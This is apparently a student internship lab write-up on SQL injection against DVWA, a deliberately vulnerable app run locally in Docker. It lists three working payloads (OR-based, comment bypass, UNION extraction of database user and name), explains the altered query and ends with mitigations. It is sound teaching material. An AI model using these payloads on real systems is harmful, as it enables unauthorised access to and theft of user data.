# Task 3: SQL Injection on DVWA (Low Security)

**Internship:** OIBSIP – Security Analyst Internship  
**Task Level:** Beginner  
**Author:** [Your Name]  
**Student ID:** x24334715

## Objective
Demonstrate an SQL Injection vulnerability on DVWA set to Low security, extract user data and database information.

## Tools Used
- DVWA (Damn Vulnerable Web Application) – via Docker
- Browser (manual injection)
- curl (scripted injection)

## Setup

### Run DVWA with Docker
```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
```
Then visit http://localhost → login with admin/password → Setup page → Create/Reset Database → Set security to Low.

## Payloads Used

### 1. Basic OR Injection – Dump All Users
```sql
1' OR '1'='1
```
**Result:** Returned all 5 users (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith)

### 2. Comment-Based Bypass
```sql
' OR 1=1-- -
```
**Result:** Same – all users returned by commenting out the rest of the query

### 3. UNION Attack – Extract DB Info
```sql
1' UNION SELECT user(), database()-- -
```
**Result:**
- First name: app@localhost → database user running the application
- Surname: dvwa → database name

## How SQL Injection Works

The vulnerable query looks like this internally:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

When we inject `1' OR '1'='1`, it becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
Since `'1'='1'` is always true, all rows are returned.

## Impact
- Full user data exposed
- Database structure revealed
- Can escalate to reading system files or remote code execution

## Mitigation
- Use **prepared statements / parameterised queries**
- **Validate and sanitise** all user inputs
- Disable **detailed error messages** in production
- Apply **least privilege** to database accounts
- Use a **WAF** (Web Application Firewall)

## References
- OWASP Top 10 – A03: Injection
- https://owasp.org/www-community/attacks/SQL_Injection
- https://portswigger.net/web-security/sql-injection

## Demo Video
[Watch Demo](https://www.loom.com/share/df25dd80c025470d8f8ac9dcbcad831a)
